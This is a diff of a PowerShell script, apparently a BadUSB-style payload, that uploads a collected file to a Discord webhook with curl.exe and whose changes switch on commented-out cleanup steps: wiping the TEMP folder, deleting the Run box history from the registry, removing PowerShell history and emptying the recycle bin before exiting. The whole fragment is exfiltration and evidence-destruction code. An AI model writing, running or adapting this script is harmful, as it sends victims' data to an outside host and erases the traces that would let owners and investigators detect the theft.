@@ -107,18 +107,18 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 # Delete contents of Temp folder 
 
 Upload-Discord -file $env:TMP\$FileName -text "this is a text file"
-#rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
-#reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
 
-#Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
 
-#Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-#exit
+exit
